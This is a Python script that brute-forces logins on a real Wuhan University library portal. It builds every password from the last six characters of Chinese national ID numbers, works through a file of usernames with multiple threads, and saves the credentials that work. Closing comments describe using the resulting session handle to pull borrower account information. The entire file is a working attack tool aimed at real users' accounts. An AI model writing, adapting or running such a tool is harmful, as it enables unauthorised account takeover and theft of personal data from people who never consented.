# -*- coding: utf-8 -*-
"""
Created on Mon Aug 08 20:03:17 2016

@author: hp
"""
import time
import random
import urllib2
from bs4 import BeautifulSoup
import cookielib
import requests
import threading
from Queue import Queue
from multiprocessing.dummy import Pool
import os
###########################################################
import logging  
import logging.handlers  

log_name=str(int(time.time()))
LOG_FILE = r'E:\whu\%s.log'%log_name
handler = logging.handlers.RotatingFileHandler(LOG_FILE, maxBytes = 1024*1024, backupCount = 5) # 实例化handler   
fmt = '%(asctime)s - %(filename)s:%(lineno)s - %(name)s - %(message)s'  
formatter = logging.Formatter(fmt)   # 实例化formatter  
handler.setFormatter(formatter)      # 为handler添加formatter  
logger = logging.getLogger(log_name)    # 获取名为tst的logger  
logger.addHandler(handler)           # 为logger添加handler  
logger.setLevel(logging.DEBUG)
###############################################################

def adjust_format(n):
    if len(str(n))==1:
        return '00%d'%n
    elif len(str(n))==2:
        return '0%d'%n
    else:
        return str(n)

def produce_password_set():      
    password_set=[]
    number1=['0%d'%i for i in range(1,10)]+[str(i) for i in range(1,32) if i>=10]
    number2=map(adjust_format,range(1,1000))
    number3=[str(i) for i in range(10)]
    number3.append('X')
#    number1=['15']
#    number2=map(adjust_format,range(320,330))
#    number3=['X']
    
    count=0
    for n3 in number3:
        for n1 in number1:
            for n2 in number2:
                password=n1+n2+n3
                password_set.append(password)
                print count,password
                count+=1
    return password_set

class Brute:
    def __init__(self,password_set,username,thread_num=50):
        self.password_list=password_set
        self.password_q=Queue()
        for p in self.password_list:
            self.password_q.put(p)
        self.username=username
        self.lock=threading.Lock()
        self.thread_num=thread_num
            
    def check(self,username,password):
        url='http://metalib.lib.whu.edu.cn/pds'
        headers={
                'Referer':'http://metalib.lib.whu.edu.cn/pds',
                'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36'
                }
        
        postdata={
                'func':'login',
                'calling_system':'idp_proxy',
                'term1':'short',
                'selfreg':'',
                'bor_id':username,
                'bor_verification':password,
                'institute':'WHU'    
                }
                
        session=requests.session()
        session.cookies = cookielib.LWPCookieJar()
        while 1:
            try:
                response=session.post(url, data=postdata, headers=headers)
                break
            except Exception as e:
                logger.info(e)
#                print e
#                time.sleep(random.random())
        content=response.text
        if content.find('pds_handle')>-1:
            logger.info('>'*20+'successfully!!!!!!!!!!!!'+username+'\t'+password+'\r\n')
            self.save(username,password)
            raise Exception('exit')
        else:
            logger.info('wrong\t'+username+'\t'+password+'\r\n')
            
    def save(self,username,password):
        with open(r'e:\whu\data.txt','a') as f:
            f.write(username+'\t'+password+'\r\n')
            
    def initialize_password_q(self):
#        print 'initialize_password_q'
#        logger.info('initialize_password_q')
        self.lock.acquire()
        self.password_q=Queue()
        for p in self.password_list:
            self.password_q.put(p)
        self.lock.release()
#        print 'the length is ',self.password_q.qsize()
#        logger.info('the length is ',self.password_q.qsize())
        
    def single_check(self,username):
        while not self.password_q.empty():
            self.lock.acquire()
            password=self.password_q.get()
            self.lock.release()
            self.check(username,password)

    def multi_check(self,username):
        ts=[]
        for _ in range(self.thread_num):
            t=threading.Thread(target=self.single_check,args=(username,))
            ts.append(t)
            t.start()
        for th in ts:
            th.join()
    
    def multi_process(self):
        pool=Pool()
        pool.map(self.multi_check,self.usernames)
    
    def start(self):
        self.multi_check(self.username)
#            self.initialize_password_q()
            
if __name__=='__main__':
    password_set=produce_password_set()
    lines=open(r'E:\whu\list.txt').read().split('\n')[3:-1]
    username_set=[l.split('\t')[0] for l in lines]
    for username in username_set:
        b=Brute(password_set,username,thread_num=5)
        b.start()
        print username
#    b.multi_process()
    

#身份证后六位：
#10 0779
#01-31
#001-999
#0-9 X


#the key is to get pds_handle from the post process,then you can encode the other url to get info
#soup=BeautifulSoup(content)
#pds_handle=soup.a['href'].split('&')[1]
#info_url='http://opac.lib.whu.edu.cn/F/9Y9LI851UXLVRT335191L8G39G3IYFDBATF3HTMFBQ84H3BLL3-03684?func=bor-info&'+pds_handle
#content=urllib2.urlopen(info_url).read()
#print content





